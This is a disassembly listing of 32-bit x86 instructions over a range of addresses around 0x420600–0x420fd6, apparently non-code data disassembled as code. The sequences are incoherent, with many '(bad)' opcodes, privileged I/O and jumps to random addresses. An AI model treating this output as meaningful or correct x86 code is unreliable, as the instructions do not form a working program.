  4205af:	xchg   edx,eax
  4205b0:	push   ss
  4205b1:	jmp    0x420570
  4205b3:	mov    bh,0x5b
  4205b5:	dec    edi
  4205b6:	pop    esp
  4205b7:	loope  0x420581
  4205b9:	int    0x77
  4205bb:	gs das 
  4205bd:	outs   dx,DWORD PTR ds:[esi]
  4205be:	or     al,0x14
  4205c0:	xor    al,0x52
  4205c2:	call   0x3f2c5f10
  4205c7:	mov    dl,0x50
  4205c9:	sti    
  4205ca:	mov    ah,0xa2
  4205cc:	inc    edi
  4205cd:	sbb    al,0xe8
  4205cf:	sbb    eax,DWORD PTR [edx]
  4205d1:	pop    ss
  4205d2:	jmp    0xc0cca31e
  4205d7:	icebp  
  4205d8:	sar    ebp,cl
  4205da:	dec    esp
  4205db:	inc    esi
  4205dc:	sub    DWORD PTR [ebx-0xa],eax
  4205df:	jbe    0x420616
  4205e1:	test   al,0x94
  4205e3:	xor    DWORD PTR [edx-0x17],eax
  4205e6:	mov    eax,ds:0xa16f9479
  4205eb:	pop    esi
  4205ec:	out    0xe7,eax
  4205ee:	stc    
  4205ef:	fwait
  4205f0:	ja     0x4205ec
  4205f2:	xchg   DWORD PTR ds:0x3ae4ef8a,eax
  4205f8:	cwde   
  4205f9:	les    ebx,FWORD PTR [eax-0x50]
  4205fc:	(bad)  
  4205fe:	out    dx,eax
  4205ff:	sbb    DWORD PTR [edx-0x5cc367c0],esi
  420605:	jmp    0x420593
  420607:	cmp    ah,cl
  420609:	in     eax,0xbd
  42060b:	js     0x420643
  42060d:	mov    esi,0x120a
	...
  420672:	add    BYTE PTR [eax],al
  420674:	test   BYTE PTR [eax-0x48],ch
  420677:	or     ah,bh
  420679:	fdiv   DWORD PTR [esp+ebp*8+0x78d500c5]
  420680:	es stc 
  420682:	lock out dx,al
  420684:	lock pop eax
  420686:	add    DWORD PTR [eax],eax
  420688:	add    al,0x1
  42068a:	add    BYTE PTR [eax],al
  42068c:	xor    BYTE PTR ds:0x5d039266,dh
  420692:	sbb    al,0x61
  420694:	loope  0x4206cf
  420696:	jl     0x4206bd
  420698:	and    bh,BYTE PTR [ebx+ebp*4]
  42069b:	mov    ss,WORD PTR ss:[eax+0x7d]
  42069f:	hlt    
  4206a0:	sbb    eax,0x45a7f66d
  4206a5:	add    al,0x77
  4206a7:	icebp  
  4206a8:	in     al,dx
  4206a9:	shr    DWORD PTR [esi-0x1e],1
  4206ac:	gs scas al,BYTE PTR es:[edi]
  4206ae:	adc    eax,0x2522e765
  4206b3:	jle    0x42068c
  4206b5:	lds    esi,FWORD PTR [edi-0x5bbc7a7f]
  4206bb:	sti    
  4206bc:	pop    eax
  4206bd:	iret   
  4206be:	pop    eax
  4206bf:	into   
  4206c0:	mov    cl,0x85
  4206c2:	xor    edx,DWORD PTR [esi-0x24ccd4c5]
  4206c8:	mov    esi,0xbe2ac1
  4206cd:	cmovp  edx,DWORD PTR [ebx+0x17]
  4206d1:	push   cs
  4206d2:	and    eax,0x519dd1c9
  4206d7:	fisub  WORD PTR [ebp-0x75082aad]
  4206dd:	test   al,0x83
  4206df:	dec    eax
  4206e0:	outs   dx,BYTE PTR ds:[esi]
  4206e1:	fs js  0x4206ac
  4206e4:	imul   ebx,DWORD PTR [edx+0x330bb18b],0xfffffff2
  4206eb:	aas    
  4206ec:	jmp    0x42075a
  4206ee:	mov    ah,0xc5
  4206f0:	or     al,0x20
  4206f2:	and    DWORD PTR [ebp-0x19],edi
  4206f5:	dec    esi
  4206f6:	push   eax
  4206f7:	bnd ret 
  4206f9:	in     eax,dx
  4206fa:	inc    eax
  4206fb:	add    al,0x81
  4206fd:	mov    ebx,DWORD PTR [esi+ebp*8+0x3da03b71]
  420704:	and    eax,0x12982efb
  420709:	or     dl,BYTE PTR [ebx+0x3841ae2e]
  42070f:	in     al,dx
  420710:	cmp    eax,0x82156ddc
  420715:	ja     0x4206bf
  420717:	push   edi
  420718:	mov    ecx,0x75431dcc
  42071d:	xor    DWORD PTR [edi],eax
  42071f:	shr    DWORD PTR [eax+0x4107a24c],cl
  420725:	xchg   DWORD PTR [esi],ebp
  420727:	push   ebx
  420728:	pop    ss
  420729:	jbe    0x42077a
  42072b:	jecxz  0x420706
  42072d:	xchg   DWORD PTR [eax+0x72ea29b8],esp
  420733:	add    BYTE PTR [ecx+0x2f],0x19
  420737:	pop    edi
  420738:	mov    ebx,0xe6586126
  42073d:	mov    al,ds:0x183c7994
  420742:	xchg   ebp,eax
  420743:	add    edx,ebx
  420745:	pop    DWORD PTR [edi-0x6f2ee7e8]
  42074b:	not    esi
  42074d:	mov    edi,0xb4e181d4
  420752:	mov    ds:0x33469f74,al
  420757:	and    eax,0xcd5e252
  42075c:	sub    DWORD PTR [ecx+ebx*4],ecx
  42075f:	adc    al,0xc2
  420761:	shr    al,1
  420763:	stc    
  420764:	jb     0x42074e
  420766:	push   ecx
  420767:	dec    ecx
  420768:	mov    bl,BYTE PTR [eax]
  42076a:	sbb    DWORD PTR [edi+0x741829d4],ebx
  420770:	push   eax
  420771:	iret   
  420772:	pop    ebp
  420773:	sub    al,BYTE PTR [edi]
  420775:	push   0xfffffffe
  420777:	xchg   BYTE PTR [ecx],ah
  420779:	pop    esi
  42077a:	pop    esp
  42077b:	or     edi,edi
  42077d:	in     eax,dx
  42077e:	push   cs
  42077f:	cmp    dl,BYTE PTR [ebp+0x37]
  420782:	std    
  420783:	popf   
  420784:	jo     0x42079e
  420786:	pusha  
  420787:	cmp    al,0x6b
  420789:	and    DWORD PTR [edi+0x20],ecx
  42078c:	ds mov eax,0xd1b1
	...
  4207f2:	add    BYTE PTR [eax],al
  4207f4:	mov    DWORD PTR [edi],ebp
  4207f6:	and    eax,0xad8aa780
  4207fb:	das    
  4207fc:	cmp    DWORD PTR [edi-0x24],ebp
  4207ff:	pusha  
  420800:	cmp    ah,BYTE PTR [edx+0x10]
  420803:	mov    dh,0xf4
  420805:	pop    ecx
  420806:	add    DWORD PTR [eax],eax
  420808:	add    al,0x1
  42080a:	add    BYTE PTR [eax],al
  42080c:	bound  esp,QWORD PTR [esi]
  42080e:	in     eax,0x83
  420810:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420811:	ds or  ah,ch
  420814:	mov    ah,0x4f
  420816:	sub    esp,DWORD PTR [edx+0x55de210d]
  42081c:	hlt    
  42081d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42081e:	xchg   edi,eax
  42081f:	sub    dl,BYTE PTR [ecx+eax*8-0x8]
  420823:	pop    ss
  420824:	and    edx,esp
  420826:	stos   DWORD PTR es:[edi],eax
  420827:	arpl   WORD PTR [esi-0x5d],di
  42082a:	or     bh,BYTE PTR gs:[edx+0x5f7c557c]
  420831:	sub    BYTE PTR [ebx],bh
  420833:	les    esi,FWORD PTR [edx]
  420835:	or     al,0xb9
  420837:	stc    
  420838:	sub    al,0xf1
  42083a:	outs   dx,DWORD PTR ds:[esi]
  42083b:	js     0x420805
  42083d:	aas    
  42083e:	dec    ecx
  42083f:	leave  
  420840:	stos   DWORD PTR es:[edi],eax
  420841:	pop    es
  420842:	or     ah,BYTE PTR [edi+0x26dea825]
  420848:	jbe    0x420874
  42084a:	test   BYTE PTR [edi],cl
  42084c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42084d:	dec    ebx
  42084e:	sub    dl,0x29
  420851:	cli    
  420852:	xor    ecx,DWORD PTR [edx-0x44dde6bc]
  420858:	xor    DWORD PTR [eax],edi
  42085a:	mov    dl,0xd7
  42085c:	push   edx
  42085d:	aam    0x5
  42085f:	mov    eax,0xbac19f97
  420864:	xchg   ebx,eax
  420865:	jns    0x4208de
  420867:	lea    esi,[edi+0x3756f482]
  42086d:	lods   eax,DWORD PTR ds:[esi]
  42086e:	jge    0x4208a6
  420870:	retf   0xee29
  420873:	mov    al,0x21
  420875:	ficomp DWORD PTR [ebp+0x12]
  420878:	cmp    al,0x93
  42087a:	sbb    DWORD PTR [esi],edi
  42087c:	xlat   BYTE PTR ds:[ebx]
  42087d:	fisub  DWORD PTR [esi+0x787d96ad]
  420883:	(bad)  
  420885:	pop    esi
  420886:	inc    ecx
  420887:	xor    BYTE PTR [eax-0x3a],al
  42088a:	inc    esp
  42088b:	push   es
  42088c:	mov    ah,0xb5
  42088e:	lock inc esi
  420890:	mov    esi,0xc6fd5ccc
  420895:	inc    ebx
  420896:	jl     0x42087e
  420898:	test   DWORD PTR [esi+ecx*2],edx
  42089b:	xchg   edx,eax
  42089c:	jno    0x4208fe
  42089e:	aas    
  42089f:	xchg   ebp,eax
  4208a0:	xor    DWORD PTR ds:0xad8c2366,ecx
  4208a6:	scas   eax,DWORD PTR es:[edi]
  4208a7:	ds in  al,0x8a
  4208aa:	aas    
  4208ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208ac:	cmp    eax,0x16dfb3b3
  4208b1:	xor    ch,BYTE PTR [ebp+0x2c090f5d]
  4208b7:	in     al,dx
  4208b8:	aas    
  4208b9:	rcl    DWORD PTR [ebx],cl
  4208bb:	push   ds
  4208bc:	retf   
  4208bd:	push   edi
  4208be:	out    dx,al
  4208bf:	or     DWORD PTR [ebx],ecx
  4208c1:	push   ebp
  4208c2:	pop    eax
  4208c3:	pop    ecx
  4208c4:	pop    ss
  4208c5:	xchg   edi,eax
  4208c6:	loopne 0x42093c
  4208c8:	mov    ds:0xcf8198e4,eax
  4208cd:	fcomp  QWORD PTR [eax]
  4208cf:	mov    cl,0x45
  4208d1:	bound  ecx,QWORD PTR [eax]
  4208d3:	imul   ecx,DWORD PTR [esi+0x38],0x4218d3bd
  4208da:	(bad)  [ebp-0x18]
  4208dd:	sahf   
  4208de:	pop    esp
  4208df:	inc    ebx
  4208e0:	leave  
  4208e1:	jns    0x420874
  4208e3:	and    al,0xff
  4208e5:	cli    
  4208e6:	cmp    DWORD PTR [ebp+ebp*8-0x3c934d03],ecx
  4208ed:	push   esi
  4208ee:	jg     0x4208cf
  4208f0:	dec    esp
  4208f1:	jae    0x4208b8
  4208f3:	jbe    0x42088b
  4208f5:	add    DWORD PTR [ecx],0x2f391021
  4208fb:	cwde   
  4208fc:	mov    edi,0xd56f1e63
  420901:	xchg   ebx,eax
  420902:	scas   al,BYTE PTR es:[edi]
  420903:	or     ah,bl
  420905:	xor    ebx,ebp
  420907:	test   DWORD PTR [ecx+0x7a],eax
  42090a:	in     al,dx
  42090b:	jg     0x420978
  42090d:	js     0x4208d5
  42090f:	sbb    eax,0x0
	...
  420974:	fsub   QWORD PTR [ebx+esi*2-0x12084b3]
  42097b:	mov    ch,0xd2
  42097d:	ja     0x4209dd
  42097f:	mov    dh,0xac
  420981:	enter  0xbe1d,0xf8
  420985:	pop    edx
  420986:	add    DWORD PTR [eax],eax
  420988:	add    al,0x1
  42098a:	add    BYTE PTR [eax],al
  42098c:	jmp    0xe604e1ff
  420991:	pop    es
  420992:	push   ss
  420993:	xchg   BYTE PTR [edi+0x46acf1a3],ch
  420999:	iret   
  42099a:	mov    ebp,0xeb23f37e
  42099f:	in     eax,dx
  4209a0:	inc    ebx
  4209a1:	xchg   DWORD PTR [ecx],esi
  4209a3:	mov    BYTE PTR [eax+0x765d8d22],0xa1
  4209aa:	dec    esi
  4209ab:	call   0xb244b257
  4209b0:	popa   
  4209b1:	je     0x420a0f
  4209b3:	nop    DWORD PTR [edi-0xc22c6d8]
  4209ba:	fdivr  DWORD PTR ds:0x16af59a3
  4209c0:	loopne 0x4209b4
  4209c2:	ins    DWORD PTR es:[edi],dx
  4209c3:	push   eax
  4209c4:	les    edx,FWORD PTR [esi+0x4a2154ff]
  4209ca:	mov    al,0x6
  4209cc:	push   0xa4942d8d
  4209d1:	ins    DWORD PTR es:[edi],dx
  4209d2:	inc    edi
  4209d3:	xor    esp,edi
  4209d5:	mov    eax,0x7eb9507c
  4209da:	test   ecx,0xa5bee0e8
  4209e0:	shl    DWORD PTR [edx+0x14b56027],cl
  4209e6:	mov    al,ds:0x987740a7
  4209eb:	(bad)  
  4209ec:	cmp    ebx,DWORD PTR [esi+0x1c169a28]
  4209f2:	jg     0x420a0f
  4209f4:	or     al,0xea
  4209f6:	lock dec DWORD PTR [esi-0x41]
  4209fa:	cmp    BYTE PTR [ebx-0x5d52afac],al
  420a00:	lods   eax,DWORD PTR ds:[esi]
  420a01:	shl    BYTE PTR [edi-0x37],1
  420a04:	sbb    BYTE PTR ds:0x2d437e1,ah
  420a0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a0b:	outs   dx,DWORD PTR ds:[esi]
  420a0c:	(bad)  
  420a0e:	jp     0x4209e3
  420a10:	(bad)  
  420a11:	push   0xffffffe7
  420a13:	adc    dl,cl
  420a15:	adc    eax,ebp
  420a17:	das    
  420a18:	sbb    BYTE PTR [edi-0x64],dl
  420a1b:	mov    DWORD PTR [eax+eax*4+0x5],esp
  420a1f:	jge    0x420a9e
  420a21:	push   edx
  420a22:	mov    esp,DWORD PTR [ecx]
  420a24:	daa    
  420a25:	inc    edx
  420a26:	gs push edx
  420a28:	mov    ebx,0x1a36cd27
  420a2d:	nop
  420a2e:	add    DWORD PTR [ebx+0xc0edeba],ecx
  420a34:	mov    ah,0x15
  420a36:	pop    esp
  420a37:	lea    ecx,[edi+eax*4+0x9c06e40]
  420a3e:	xchg   ebx,eax
  420a3f:	out    dx,al
  420a40:	mov    ch,0x18
  420a42:	pop    edx
  420a43:	loopne 0x4209ca
  420a45:	(bad)  
  420a46:	out    dx,al
  420a47:	(bad)  
  420a48:	xlat   BYTE PTR ds:[ebx]
  420a49:	lahf   
  420a4a:	inc    esi
  420a4b:	sbb    BYTE PTR [ebp+0x16],dl
  420a4e:	push   ecx
  420a4f:	inc    ecx
  420a50:	add    BYTE PTR [edx+eax*1+0x71],dh
  420a54:	rcl    DWORD PTR [edi],cl
  420a56:	jecxz  0x420ad3
  420a58:	adc    al,0x3
  420a5a:	or     DWORD PTR [ebx+0x1f64b4a1],ecx
  420a60:	jmp    0x420adb
  420a62:	xor    DWORD PTR [ecx+0x15d77cc4],edx
  420a68:	int    0x70
  420a6a:	imul   edi,DWORD PTR [edi+eax*8-0x47648cc2],0x6c
  420a72:	xor    ecx,DWORD PTR [edi]
  420a74:	ret    0x84b7
  420a77:	jb     0x420ac9
  420a79:	pop    eax
  420a7a:	dec    edi
  420a7b:	and    bl,BYTE PTR [edx]
  420a7d:	mov    ecx,0x73eace18
  420a82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a83:	mov    cl,0xf3
  420a85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a86:	jge    0x420a55
  420a88:	and    al,0xed
  420a8a:	mov    esi,0xe77d85ec
  420a8f:	jle    0x420a91
	...
  420af1:	add    BYTE PTR [eax],al
  420af3:	add    bh,bl
  420af5:	xor    ch,BYTE PTR [edi-0x6010ed]
  420afb:	(bad)  
  420afc:	xlat   BYTE PTR ds:[ebx]
  420afd:	out    dx,eax
  420afe:	(bad)  
  420aff:	cld    
  420b00:	iret   
  420b01:	cli    
  420b02:	(bad)  
  420b04:	cld    
  420b05:	pop    ebx
  420b06:	add    DWORD PTR [eax],eax
  420b08:	add    al,0x1
  420b0a:	add    BYTE PTR [eax],al
  420b0c:	outs   dx,DWORD PTR ds:[esi]
  420b0d:	loopne 0x420b02
  420b0f:	push   ss
  420b10:	jo     0x420aaf
  420b12:	sub    eax,0xd3c8d031
  420b17:	mov    ah,0xc7
  420b19:	mov    ds:0xb182f81f,eax
  420b1e:	mov    dl,0xca
  420b20:	sbb    BYTE PTR [edi-0x3b],bh
  420b23:	(bad)  
  420b24:	adc    BYTE PTR [edi-0x1d226d56],dl
  420b2a:	jnp    0x420b11
  420b2c:	pusha  
  420b2d:	pushf  
  420b2e:	aaa    
  420b2f:	ins    BYTE PTR es:[edi],dx
  420b30:	mov    bl,0x7f
  420b32:	fisub  DWORD PTR [ebp-0x4c184e96]
  420b38:	adc    eax,0x73817c4
  420b3d:	fsubr  DWORD PTR [esi+0x15]
  420b40:	jle    0x420b4b
  420b42:	clc    
  420b43:	rcr    DWORD PTR [eax-0x42],cl
  420b46:	pop    ecx
  420b47:	aad    0x1f
  420b49:	cli    
  420b4a:	pop    es
  420b4b:	sub    bl,ah
  420b4d:	ret    
  420b4e:	leave  
  420b4f:	bound  edi,QWORD PTR [ebx]
  420b51:	in     al,0xb5
  420b53:	push   eax
  420b54:	(bad)  
  420b55:	mov    ecx,0x93f78303
  420b5a:	mov    edx,0x26e2a418
  420b5f:	mov    bl,0xc3
  420b61:	xor    dh,BYTE PTR [ebx]
  420b63:	add    eax,0xa411b90d
  420b68:	in     eax,dx
  420b69:	aad    0xd6
  420b6b:	sbb    edi,DWORD PTR [ebp-0x119d19ae]
  420b71:	stc    
  420b72:	sbb    edx,DWORD PTR [esi]
  420b74:	dec    esp
  420b75:	sub    eax,esi
  420b77:	std    
  420b78:	cli    
  420b79:	pop    edx
  420b7a:	(bad)  
  420b7b:	adc    al,0x12
  420b7d:	jb     0x420b2d
  420b7f:	mov    ch,BYTE PTR [esi+ebp*2-0x7c597000]
  420b86:	imul   esi,DWORD PTR [esi+0x78],0xa4f7b66c
  420b8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b8e:	or     al,0x90
  420b90:	inc    eax
  420b91:	dec    ecx
  420b92:	xchg   edi,eax
  420b93:	fdiv   DWORD PTR [ecx-0x671f97ee]
  420b99:	sub    DWORD PTR [ebx],ecx
  420b9b:	aaa    
  420b9c:	enter  0x3b65,0x8d
  420ba0:	loope  0x420bb4
  420ba2:	push   es
  420ba3:	mov    al,ds:0x12023e91
  420ba8:	(bad)  
  420ba9:	(bad)  
  420baa:	out    dx,al
  420bab:	push   0xffffffc2
  420bad:	cmp    al,0x61
  420baf:	xchg   ebx,eax
  420bb0:	fisttp DWORD PTR [ecx]
  420bb2:	aad    0x11
  420bb4:	or     BYTE PTR [eax-0x3f27c771],bh
  420bba:	mov    ebx,0x8e6918bf
  420bbf:	xor    ecx,DWORD PTR [ecx-0x58dfaa34]
  420bc5:	clc    
  420bc6:	scas   eax,DWORD PTR es:[edi]
  420bc7:	push   es
  420bc8:	and    al,0x7b
  420bca:	jge    0x420bbd
  420bcc:	gs push ds
  420bce:	rcr    ebx,1
  420bd0:	retf   
  420bd1:	out    dx,eax
  420bd2:	fidivr DWORD PTR [esi]
  420bd4:	pop    ebp
  420bd5:	aam    0xfd
  420bd7:	(bad)  
  420bd8:	cmp    DWORD PTR [edi-0x58],eax
  420bdb:	push   ecx
  420bdc:	sub    BYTE PTR [edx],cl
  420bde:	mov    edx,DWORD PTR [esi+0x56]
  420be1:	mov    edx,DWORD PTR [edx]
  420be3:	aam    0x1
  420be5:	dec    ebp
  420be6:	jmp    0x2dad:0xd3dbba95
  420bed:	es jbe 0x420bf2
  420bf0:	xor    edx,DWORD PTR [ecx+0x82a6a4b]
  420bf6:	add    eax,0x210137e
  420bfb:	jle    0x420c3c
  420bfd:	sub    al,0x8a
  420bff:	mov    BYTE PTR [ecx],bl
  420c01:	(bad)  
  420c02:	xchg   ebx,eax
  420c03:	add    ebx,DWORD PTR [eax-0x49]
  420c06:	xchg   ebx,eax
  420c07:	ret    0xee8c
  420c0a:	jl     0x420c88
  420c0c:	stos   DWORD PTR es:[edi],eax
  420c0d:	pop    es
  420c0e:	dec    edx
  420c0f:	add    DWORD PTR [eax],eax
	...
  420c71:	add    BYTE PTR [eax],al
  420c73:	add    BYTE PTR [edx-0x604ef4eb],cl
  420c79:	mov    edi,0x886e3fba
  420c7e:	add    ebp,esp
  420c80:	mov    eax,ds:0x6dc938
  420c85:	pop    ebp
  420c86:	add    DWORD PTR [eax],eax
  420c88:	add    al,0x1
  420c8a:	add    BYTE PTR [eax],al
  420c8c:	sub    eax,0x582657e4
  420c91:	sbb    BYTE PTR [ebp-0x8],dl
  420c94:	shl    BYTE PTR [ebx+0x32],1
  420c97:	cmp    eax,0xcc5a0de2
  420c9c:	sar    DWORD PTR [eax-0x66],0xb4
  420ca0:	out    0x1d,al
  420ca2:	xchg   ecx,eax
  420ca3:	in     al,dx
  420ca4:	not    dl
  420ca6:	mov    ah,0x1c
  420ca8:	sti    
  420ca9:	xchg   ebx,eax
  420caa:	add    eax,0x156204f8
  420caf:	jb     0x420cfe
  420cb1:	pop    ebp
  420cb2:	lea    edi,[edx-0x48]
  420cb5:	aas    
  420cb6:	sbb    dl,BYTE PTR [esi+0x41c999bc]
  420cbc:	adc    DWORD PTR [esi],esp
  420cbe:	aas    
  420cbf:	xchg   esp,eax
  420cc0:	nop
  420cc1:	push   esi
  420cc2:	aas    
  420cc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420cc4:	loope  0x420c56
  420cc6:	imul   edi,DWORD PTR [edx+0x2e137618],0x4c
  420ccd:	push   0xc12cf673
  420cd2:	jae    0x420d1f
  420cd4:	sub    eax,0x84f8fe92
  420cd9:	mov    al,BYTE PTR [edi+0x6a5e8ed6]
  420cdf:	or     ecx,ebp
  420ce1:	cdq    
  420ce2:	popf   
  420ce3:	stos   BYTE PTR es:[edi],al
  420ce4:	icebp  
  420ce5:	std    
  420ce6:	hlt    
  420ce7:	sbb    al,ah
  420ce9:	fistp  WORD PTR [esi-0x67]
  420cec:	mov    edx,0xef463953
  420cf1:	or     ebp,DWORD PTR [ecx]
  420cf3:	xchg   esp,eax
  420cf4:	es push ecx
  420cf6:	in     al,dx
  420cf7:	mov    eax,DWORD PTR [ecx+0x638296b8]
  420cfd:	inc    ebp
  420cfe:	pop    edx
  420cff:	outs   dx,DWORD PTR ds:[esi]
  420d00:	xchg   edi,eax
  420d01:	ja     0x420ca1
  420d03:	sbb    DWORD PTR [esi-0x7],edx
  420d06:	xor    ebp,0x3f
  420d09:	mov    DWORD PTR ds:0x51d316a2,ebx
  420d0f:	jmp    0x420d5e
  420d11:	ds push es
  420d13:	mov    bh,0x7a
  420d15:	mov    dh,BYTE PTR [edi]
  420d17:	pusha  
  420d18:	and    esp,edx
  420d1a:	hlt    
  420d1b:	pop    es
  420d1c:	nop
  420d1d:	jge    0x420d70
  420d1f:	(bad)  
  420d20:	jg     0x420d3a
  420d22:	inc    esi
  420d23:	jmp    0x2fa0c982
  420d28:	inc    ebx
  420d29:	out    dx,al
  420d2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d2b:	es push ss
  420d2d:	in     eax,dx
  420d2e:	push   es
  420d2f:	adc    ecx,DWORD PTR [ebx]
  420d31:	add    BYTE PTR [esi-0x9f8b261],ah
  420d37:	retf   0x2df6
  420d3a:	push   ebp
  420d3b:	pop    ebp
  420d3c:	sub    DWORD PTR [ebp+esi*4+0x70],ebx
  420d40:	mov    esi,0x987a6a09
  420d45:	dec    edx
  420d46:	fisttp DWORD PTR [edi+0x361f3d90]
  420d4c:	pop    ds
  420d4d:	adc    eax,0xea4fb639
  420d52:	pop    ds
  420d53:	mov    ebp,0x5b9d6f31
  420d58:	gs mov esp,0xebbad760
  420d5e:	clc    
  420d5f:	jnp    0x420d71
  420d61:	jae    0x420d98
  420d63:	mov    bh,0xc0
  420d65:	pop    edi
  420d66:	add    DWORD PTR [ebp-0x10],esi
  420d69:	push   ds
  420d6a:	fidiv  WORD PTR [ebx-0x7c654072]
  420d70:	cmp    esp,ecx
  420d72:	xchg   edx,eax
  420d73:	xchg   esp,eax
  420d74:	cld    
  420d75:	pop    esi
  420d76:	cli    
  420d77:	jmp    0x18407604
  420d7c:	js     0x420d22
  420d7e:	add    edx,ecx
  420d80:	sahf   
  420d81:	cdq    
  420d82:	sbb    bl,dh
  420d84:	leave  
  420d85:	sar    DWORD PTR [ebx-0x35],1
  420d88:	call   0x3c1e758b
  420d8d:	sbb    BYTE PTR [ebx+0x6e],bh
	...
  420df4:	out    0x1e,eax
  420df6:	into   
  420df7:	push   0x9fe7f8ff
  420dfc:	push   esi
  420dfd:	inc    edi
  420dfe:	lahf   
  420dff:	mov    al,ds:0x34704608
  420e04:	add    al,0x5e
  420e06:	add    DWORD PTR [eax],eax
  420e08:	add    al,0x1
  420e0a:	add    BYTE PTR [eax],al
  420e0c:	inc    edx
  420e0d:	push   ebp
  420e0e:	sub    ch,cl
  420e10:	add    DWORD PTR [ebx-0x44a6a93b],eax
  420e16:	pop    ebx
  420e17:	sti    
  420e18:	enter  0x2430,0x2a
  420e1c:	sub    ecx,DWORD PTR [edi+0x433f2caa]
  420e22:	stos   DWORD PTR es:[edi],eax
  420e23:	cld    
  420e24:	mov    edx,0x4bcce0c
  420e29:	jp     0x420e6b
  420e2b:	ret    0x1f93
  420e2e:	push   edx
  420e2f:	out    0xa1,al
  420e31:	xor    bh,BYTE PTR [edi+ebx*1-0x45cbed33]
  420e38:	xchg   ebx,eax
  420e39:	pop    ecx
  420e3a:	mov    ah,0x5a
  420e3c:	shr    edi,0xb0
  420e3f:	mov    al,ds:0x3a2fe2f7
  420e44:	mov    al,0xbe
  420e46:	xchg   ebp,eax
  420e47:	mov    cl,0x6d
  420e49:	inc    ecx
  420e4a:	pushf  
  420e4b:	and    eax,0xf302fc5e
  420e50:	sbb    eax,0x18f3000e
  420e55:	pop    ds
  420e56:	push   ecx
  420e57:	push   cs
  420e58:	jmp    0x420ddc
  420e5a:	pop    edi
  420e5b:	xor    dh,BYTE PTR [ecx]
  420e5d:	sbb    BYTE PTR [eax-0x9e98656],bh
  420e63:	rcr    DWORD PTR [ecx+0x879c39d],1
  420e69:	jle    0x420e4d
  420e6b:	mov    ds:0xbb6fc82e,eax
  420e70:	(bad)  
  420e71:	outs   dx,BYTE PTR ds:[esi]
  420e72:	bound  esi,QWORD PTR [ecx-0x52]
  420e75:	cmp    eax,0x1dde73ce
  420e7a:	push   edi
  420e7b:	dec    ebx
  420e7c:	mov    bl,0x3d
  420e7e:	daa    
  420e7f:	dec    esi
  420e80:	dec    edi
  420e81:	frstor [ebx-0xf]
  420e84:	mov    cl,BYTE PTR [ecx+edx*2-0x3c5a8fd9]
  420e8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e8c:	sbb    al,0xbf
  420e8e:	(bad)  [ecx-0x16a0e3cb]
  420e94:	dec    esp
  420e95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e96:	in     al,0xe8
  420e98:	xlat   BYTE PTR ds:[ebx]
  420e99:	add    al,0x8b
  420e9b:	out    0x56,eax
  420e9d:	mov    al,ds:0x23d3ec1d
  420ea2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ea3:	mov    al,bh
  420ea5:	mov    ebx,0x268d313a
  420eaa:	xchg   DWORD PTR [edx+ecx*1-0xc],esi
  420eae:	or     ebx,ebx
  420eb0:	cmp    ecx,DWORD PTR [esi+0x350bcc3e]
  420eb6:	popa   
  420eb7:	dec    esp
  420eb8:	add    DWORD PTR ds:0xaa35dcd3,0x7a26e2c4
  420ec2:	cmc    
  420ec3:	jbe    0x420f31
  420ec5:	add    dl,cl
  420ec7:	push   esp
  420ec8:	enter  0x87eb,0x4a
  420ecc:	or     DWORD PTR [ebx],ebx
  420ece:	daa    
  420ecf:	pusha  
  420ed0:	in     eax,dx
  420ed1:	xchg   ebx,eax
  420ed2:	adc    eax,0x57cdcd07
  420ed7:	fld    TBYTE PTR [ecx-0x16]
  420eda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420edb:	sub    bh,dl
  420edd:	sub    BYTE PTR [ebx],ah
  420edf:	imul   eax,DWORD PTR [edx+0xc5775c3],0x77
  420ee6:	mov    eax,ds:0xfba88506
  420eeb:	in     al,0x0
  420eed:	add    ecx,DWORD PTR [ecx]
  420eef:	js     0x420e73
  420ef1:	in     al,dx
  420ef2:	test   al,0xec
  420ef4:	mov    eax,ds:0x9c8684a3
  420ef9:	js     0x420ee2
  420efb:	inc    esi
  420efc:	imul   ebx,DWORD PTR [eax-0x5f],0xa75a6554
  420f03:	out    0xd8,al
  420f05:	jb     0x420ed3
  420f07:	loopne 0x420e94
  420f09:	add    BYTE PTR [edi+edx*1-0x223d58c5],ah
	...
  420f74:	and    BYTE PTR [edi-0x28082cbe],dl
  420f7a:	mov    cl,0xf7
  420f7c:	jg     0x420f6b
  420f7e:	or     esp,DWORD PTR [esi-0x7dd8a23e]
  420f84:	or     BYTE PTR [edi+0x1],bl
  420f87:	add    BYTE PTR [ecx+eax*1],al
  420f8a:	add    BYTE PTR [eax],al
  420f8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f8d:	int3   
  420f8e:	push   cs
  420f8f:	bound  edi,QWORD PTR [ebp+0x14a211d7]
  420f95:	test   eax,0x8f9a3f11
  420f9a:	daa    
  420f9b:	in     eax,dx
  420f9c:	out    0x3d,eax
  420f9e:	test   BYTE PTR [esp+edi*4],al
  420fa1:	or     cl,cl
  420fa3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420fa4:	fldenv [ebp+0x55]
  420fa7:	cmp    eax,0x5a5e94c
  420fac:	and    al,0x43
  420fae:	mov    ebp,0xb7909bb5
  420fb3:	inc    ecx
  420fb4:	or     eax,0x4d3df67f
  420fb9:	rcl    BYTE PTR [eax],cl
  420fbb:	mov    ebx,0xa5df74b7
  420fc0:	xchg   edi,eax
  420fc1:	and    ebx,DWORD PTR [eax+0x6]
  420fc4:	cmp    DWORD PTR [edi+eiz*8+0x4a],0xffffff9e
  420fc9:	xchg   DWORD PTR [edx-0x62cc042a],ebp
  420fcf:	scas   eax,DWORD PTR es:[edi]
  420fd0:	stc    
  420fd1:	in     al,0xf5
  420fd3:	xchg   edi,eax
  420fd4:	test   al,0x67
  420fd6:	arpl   WORD PTR [ebp+0x9],si
